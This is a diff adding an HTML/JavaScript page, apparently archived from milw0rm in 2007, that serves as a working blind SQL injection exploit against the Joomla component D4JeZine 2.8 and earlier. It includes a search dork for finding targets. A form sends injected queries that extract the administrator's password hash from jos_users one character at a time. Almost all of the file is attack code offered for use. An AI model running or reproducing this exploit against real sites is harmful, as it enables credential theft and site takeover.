@@ -1,0 +1,288 @@
+<html>
+<head>
+<title>Joomla Component D4JeZine <= 2.8 Remote BLIND SQL Injection Exploit</title>
+
+<script type="text/javascript">
+
+//'===============================================================================================
+//'[Script Name: Joomla Component D4JeZine <= 2.8 Remote BLIND SQL Injection Exploit
+//'[Coded by   : ajann
+//'[Author     : ajann
+//'[Contact    : :(
+//'[Dork       : index.php?option=com_ezine
+//'[S.Page     : http://designforjoomla.com/
+//'[$$         : $24.95 USD
+//'[Using      : Write Target after Submit Click
+//'[Method     : One Char Brute Force Technique
+//'===============================================================================================
+
+
+   function nesneyarat() {
+
+ var nesne;
+ var tarayici = navigator.appName;
+
+   
+     if(tarayici == "Microsoft Internet Explorer"){
+ nesne = new ActiveXObject("Microsoft.XMLHTTP");
+    }
+  else {
+ nesne = new XMLHttpRequest();
+
+  }
+return nesne;
+}
+
+ var http = nesneyarat();
+
+
+
+   function islemlink(adresyolla,charyolla) {
+
+
+articleidim=document.getElementById('articleid').value
+file="index.php?option=com_ezine&task=read&page=1&article="+ articleidim
+pathim=document.getElementById('path').value + file
+karakterim=document.getElementById('karakter').value + charyolla
+adres=document.getElementById('adresim').value + pathim +  adresyolla + karakterim
+
+
+ 
+
+ http.open('get', adres);
+ http.onreadystatechange = cevapFonksiyonu;
+ http.send(null);
+   
+
+}
+
+
+
+   function cevapFonksiyonu() {
+ if(http.readyState == 4){
+document.getElementById('mesaj').value = http.responseText;
+yonlendir();
+
+}
+}
+
+
+
+function yonlendir() {
+
+  if (document.getElementById('mesaj').value.indexOf('<td width="100%" class="contentheading" valign="top">', 0) == -1) {
+ alert('False');
+
+  }
+
+
+  }
+
+function dal() {
+
+if (document.getElementById('buton').value == "Test Character(0)") {
+ 
+ document.getElementById('buton').disabled = true;
+islemlink('/**/AND/**/(ascii(substring((SELECT/**/password/**/FROM/**/jos_users/**/WHERE/**/id=1),',',1))=48)/*');
+   document.getElementById('buton').value = "Test Character(1)"
+ setTimeout("document.getElementById('buton').disabled = false;",2000);
+return false;
+
+ }
+
+if (document.getElementById('buton').value == "Test Character(1)") {
+ 
+ document.getElementById('buton').disabled = true;
+islemlink('/**/AND/**/(ascii(substring((SELECT/**/password/**/FROM/**/jos_users/**/WHERE/**/id=1),',',1))=49)/*');
+   document.getElementById('buton').value = "Test Character(2)"
+ setTimeout("document.getElementById('buton').disabled = false;",2000);
+return false;
+
+ }
+
+if (document.getElementById('buton').value == "Test Character(2)") {
+ 
+ document.getElementById('buton').disabled = true;
+islemlink('/**/AND/**/(ascii(substring((SELECT/**/password/**/FROM/**/jos_users/**/WHERE/**/id=1),',',1))=50)/*');
+   document.getElementById('buton').value = "Test Character(3)"
+ setTimeout("document.getElementById('buton').disabled = false;",2000);
+return false;
+
+ }
+
+if (document.getElementById('buton').value == "Test Character(3)") {
+ 
+ document.getElementById('buton').disabled = true;
+islemlink('/**/AND/**/(ascii(substring((SELECT/**/password/**/FROM/**/jos_users/**/WHERE/**/id=1),',',1))=51)/*');
+   document.getElementById('buton').value = "Test Character(4)"
+ setTimeout("document.getElementById('buton').disabled = false;",2000);
+return false;
+
+ }
+
+if (document.getElementById('buton').value == "Test Character(4)") {
+ 
+ document.getElementById('buton').disabled = true;
+islemlink('/**/AND/**/(ascii(substring((SELECT/**/password/**/FROM/**/jos_users/**/WHERE/**/id=1),',',1))=52)/*');
+   document.getElementById('buton').value = "Test Character(5)"
+ setTimeout("document.getElementById('buton').disabled = false;",2000);
+return false;
+
+ }
+
+if (document.getElementById('buton').value == "Test Character(5)") {
+ 
+ document.getElementById('buton').disabled = true;
+islemlink('/**/AND/**/(ascii(substring((SELECT/**/password/**/FROM/**/jos_users/**/WHERE/**/id=1),',',1))=53)/*');
+   document.getElementById('buton').value = "Test Character(6)"
+ setTimeout("document.getElementById('buton').disabled = false;",2000);
+return false;
+
+ }
+
+if (document.getElementById('buton').value == "Test Character(6)") {
+ 
+ document.getElementById('buton').disabled = true;
+islemlink('/**/AND/**/(ascii(substring((SELECT/**/password/**/FROM/**/jos_users/**/WHERE/**/id=1),',',1))=54)/*');
+   document.getElementById('buton').value = "Test Character(7)"
+ setTimeout("document.getElementById('buton').disabled = false;",2000);
+return false;
+
+ }
+
+if (document.getElementById('buton').value == "Test Character(7)") {
+ 
+ document.getElementById('buton').disabled = true;
+islemlink('/**/AND/**/(ascii(substring((SELECT/**/password/**/FROM/**/jos_users/**/WHERE/**/id=1),',',1))=55)/*');
+   document.getElementById('buton').value = "Test Character(8)"
+ setTimeout("document.getElementById('buton').disabled = false;",2000);
+return false;
+
+ }
+
+if (document.getElementById('buton').value == "Test Character(8)") {
+ 
+ document.getElementById('buton').disabled = true;
+islemlink('/**/AND/**/(ascii(substring((SELECT/**/password/**/FROM/**/jos_users/**/WHERE/**/id=1),',',1))=56)/*');
+   document.getElementById('buton').value = "Test Character(9)"
+ setTimeout("document.getElementById('buton').disabled = false;",2000);
+return false;
+
+ }
+
+if (document.getElementById('buton').value == "Test Character(9)") {
+ 
+ document.getElementById('buton').disabled = true;
+islemlink('/**/AND/**/(ascii(substring((SELECT/**/password/**/FROM/**/jos_users/**/WHERE/**/id=1),',',1))=57)/*');
+   document.getElementById('buton').value = "Test Character(a)"
+ setTimeout("document.getElementById('buton').disabled = false;",2000);
+return false;
+
+ }
+
+if (document.getElementById('buton').value == "Test Character(a)") {
+ 
+ document.getElementById('buton').disabled = true;
+islemlink('/**/AND/**/(ascii(substring((SELECT/**/password/**/FROM/**/jos_users/**/WHERE/**/id=1),',',1))=97)/*');
+   document.getElementById('buton').value = "Test Character(b)"
+ setTimeout("document.getElementById('buton').disabled = false;",2000);
+return false;
+
+ }
+
+if (document.getElementById('buton').value == "Test Character(b)") {
+ 
+ document.getElementById('buton').disabled = true;
+islemlink('/**/AND/**/(ascii(substring((SELECT/**/password/**/FROM/**/jos_users/**/WHERE/**/id=1),',',1))=98)/*');
+   document.getElementById('buton').value = "Test Character(c)"
+ setTimeout("document.getElementById('buton').disabled = false;",2000);
+return false;
+
+ }
+
+if (document.getElementById('buton').value == "Test Character(c)") {
+ 
+ document.getElementById('buton').disabled = true;
+islemlink('/**/AND/**/(ascii(substring((SELECT/**/password/**/FROM/**/jos_users/**/WHERE/**/id=1),',',1))=99)/*');
+   document.getElementById('buton').value = "Test Character(d)"
+ setTimeout("document.getElementById('buton').disabled = false;",2000);
+return false;
+
+ }
+
+if (document.getElementById('buton').value == "Test Character(d)") {
+ 
+ document.getElementById('buton').disabled = true;
+islemlink('/**/AND/**/(ascii(substring((SELECT/**/password/**/FROM/**/jos_users/**/WHERE/**/id=1),',',1))=100)/*');
+   document.getElementById('buton').value = "Test Character(e)"
+ setTimeout("document.getElementById('buton').disabled = false;",2000);
+return false;
+
+ }
+
+if (document.getElementById('buton').value == "Test Character(e)") {
+ 
+ document.getElementById('buton').disabled = true;
+islemlink('/**/AND/**/(ascii(substring((SELECT/**/password/**/FROM/**/jos_users/**/WHERE/**/id=1),',',1))=101)/*');
+   document.getElementById('buton').value = "Test Character(f)"
+ setTimeout("document.getElementById('buton').disabled = false;",2000);
+return false;
+
+ }
+
+if (document.getElementById('buton').value == "Test Character(f)") {
+ 
+ document.getElementById('buton').disabled = true;
+islemlink('/**/AND/**/(ascii(substring((SELECT/**/password/**/FROM/**/jos_users/**/WHERE/**/id=1),',',1))=102)/*');
+   document.getElementById('buton').value = "Finished"
+ setTimeout("document.getElementById('buton').disabled = false;",2000);
+return false;
+
+ }
+
+
+
+  }
+
+
+</script>
+
+   </head>
+
+ <body bgcolor="#000000">
+
+<center>
+
+<p><b><font face="Verdana" size="2" color="#008000">Joomla Component D4JeZine <= 2.8 Remote BLIND SQL Injection Exploit</font></b></p>
+
+<p></p>
+    <b><font face="Arial" size="1" color="#FF0000">Target:</font><font face="Arial" size="1" color="#808080">[http://[target]/</font><font color="#00FF00" size="2" face="Arial">
+  </font><font color="#FF0000" size="2">&nbsp;</font></b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+  <input type="text" name="adresim" size="20" style="background-color: #808000" onmouseover="javascript:this.style.background='#808080';" onmouseout="javascript:this.style.background='#808000';" value="http://"></p>
+<br>
+    <b><font face="Arial" size="1" color="#FF0000">&nbsp;Path:</font><font face="Arial" size="1" color="#808080">[http://[target]/[scriptpath]&nbsp;&nbsp;&nbsp; </font></b>
+  <input type="text" name="path" size="20" style="background-color: #808000" onmouseover="javascript:this.style.background='#808080';" onmouseout="javascript:this.style.background='#808000';" value="/">
+  <p>
+    <b><font face="Arial" size="1" color="#FF0000">&nbsp;Character:</font><font face="Arial" size="1" color="#808080">[Md5 
+  Character 1-32]&nbsp;&nbsp; </font></b>
+  <input type="text" name="karakter" size="20" style="background-color: #808000" onmouseover="javascript:this.style.background='#808080';" onmouseout="javascript:this.style.background='#808000';" value="1">
+</p>
+  <p>
+    <b><font face="Arial" size="1" color="#FF0000">&nbsp;Article ID</font><font face="Arial" size="1" color="#808080">[Article 
+    ID Numeric]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </font></b>
+  <input type="text" name="articleid" size="20" style="background-color: #808000" onmouseover="javascript:this.style.background='#808080';" onmouseout="javascript:this.style.background='#808000';" value="1">
+</p>
+  <p><input type="submit" value="Test Character(0)" name="buton" onclick="dal();"></p>
+<br>
+<textarea name="mesaj" rows="1" cols="20" style="visibility:hidden">&lt;/textarea&gt; <br>
+<p>
+
+<b><font face="Verdana" size="2" color="#008000">ajann</font></b></p>
+</p>
+</center>
+
+
+ </body>
+ </html>
+
+# milw0rm.com [2007-03-27]
